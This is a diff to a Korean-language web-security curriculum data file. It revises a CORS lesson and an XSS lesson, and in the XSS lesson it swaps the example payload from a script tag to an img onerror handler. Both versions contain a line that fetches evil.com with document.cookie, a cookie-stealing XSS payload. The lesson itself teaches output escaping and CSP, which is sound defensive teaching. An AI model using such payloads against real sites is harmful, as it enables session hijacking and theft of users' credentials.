@@ -648,7 +648,7 @@ const curriculumTracks = [
                     '정식 프론트엔드(`app.company.com`)에서 API(`api.company.com`)를 호출할 때도 호스트가 달라 SOP에 막힙니다.',
                     '서버가 `Access-Control-Allow-Origin: https://app.company.com`을 명시적으로 반환해 신뢰된 출처만 안전하게 허용합니다.'
                 ],
-                whyLimit: '편하자고 `Allow-Origin: *`과 `Allow-Credentials: true`를 함께 쓰거나 요청 `Origin` 헤더를 검증 없이 그대로 반사하면 SOP 보호가 완전히 무력화됩니다.',
+                whyLimit: '인증 쿠키 요청에 `Allow-Origin: *`과 `Allow-Credentials: true`를 함께 쓰면 브라우저가 응답 자체를 차단하며, 이를 우회하려 요청 `Origin` 헤더를 검증 없이 그대로 반사하면 모든 외부 사이트에 인증 응답이 노출되어 SOP 보호가 무력화됩니다.',
                 takeaway: 'CORS는 보안을 끄는 스위치가 아니라, 허용된 출처 목록만 화이트리스트로 여는 표준 프로토콜입니다.',
                 tradeoff: '인증 쿠키가 붙는 비단순 요청은 `OPTIONS` Preflight가 선행되므로 `Access-Control-Max-Age`로 사전 요청을 캐싱해 지연을 줄입니다.',
                 metrics: { blocked: '미허용 출처 차단', risk: '낮음', passRate: '100%', grade: 'B+' },
@@ -667,7 +667,7 @@ const curriculumTracks = [
                 title: '5. 게시글에 심은 악성 스크립트(XSS) 무력화',
                 cardIds: [1, 2],
                 story: [
-                    '공격자가 댓글란에 `<script>fetch("https://evil.com?c="+document.cookie)</script>`를 입력했습니다. 이 문자열을 그대로 `innerHTML`로 렌더링하면 게시글을 본 모든 사용자의 브라우저에서 스크립트가 실행됩니다.',
+                    '공격자가 댓글란에 `<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">`를 입력했습니다. 이 문자열을 그대로 `innerHTML`로 렌더링하면 이미지 로드 실패 이벤트가 발동해 피해자 브라우저에서 악성 스크립트가 즉시 실행됩니다.',
                     '모든 사용자 입력은 출력 시 HTML 이스케이프(`textContent`)로 무력화하고, `Content-Security-Policy (CSP)` 헤더로 허용된 출처의 스크립트만 실행되게 이중 방어합니다.'
                 ],
                 takeaway: 'XSS의 근본 방어는 컨텍스트에 맞는 출력 이스케이프이며, CSP는 누락 시 피해를 막는 강력한 안전망입니다.',
@@ -680,7 +680,7 @@ const curriculumTracks = [
                         diagram: {
                             usersStatus: 'normal',
                             nodes: [
-                                { label: '악성 댓글 입력', sub: '<script>...</script>', state: 'warn', load: 55 },
+                                { label: '악성 댓글 입력', sub: '<img src=x onerror=...>', state: 'warn', load: 55 },
                                 { label: '출력 이스케이프', sub: '텍스트로 안전 렌더링', spec: 'textContent', state: 'ok', load: 20 },
                                 { label: 'CSP 헤더', sub: "script-src 'self'", spec: 'Defense in Depth', state: 'info', load: 18 }
                             ]
@@ -688,14 +688,14 @@ const curriculumTracks = [
                     },
                     {
                         label: '방어 없음 (innerHTML)',
-                        note: '피해자 브라우저에서 악성 JS 즉시 실행',
+                        note: '피해자 브라우저에서 onerror JS 즉시 실행',
                         metrics: { blocked: '뚫림 (XSS 실행)', risk: '치명적', passRate: '100%', grade: 'F' },
                         diagram: {
                             usersStatus: 'spike',
                             nodes: [
-                                { label: '악성 댓글 입력', sub: '<script>steal()</script>', state: 'err', load: 90 },
+                                { label: '악성 댓글 입력', sub: '<img src=x onerror=...>', state: 'err', load: 90 },
                                 { label: 'innerHTML 삽입', sub: '이스케이프 누락', spec: 'Vulnerable', state: 'err', load: 96 },
-                                { label: '피해자 브라우저', sub: '악성 스크립트 실행됨', state: 'err', load: 95 }
+                                { label: '피해자 브라우저', sub: '악성 핸들러 실행됨', state: 'err', load: 95 }
                             ]
                         }
                     }
@@ -703,7 +703,7 @@ const curriculumTracks = [
                 diagram: {
                     usersStatus: 'normal',
                     nodes: [
-                        { label: '악성 댓글 입력', sub: '<script>...</script>', state: 'warn', load: 55 },
+                        { label: '악성 댓글 입력', sub: '<img src=x onerror=...>', state: 'warn', load: 55 },
                         { label: '출력 이스케이프', sub: '텍스트로 안전 렌더링', spec: 'textContent', state: 'ok', load: 20 },
                         { label: 'CSP 헤더', sub: "script-src 'self'", spec: 'Defense in Depth', state: 'info', load: 18 }
                     ]
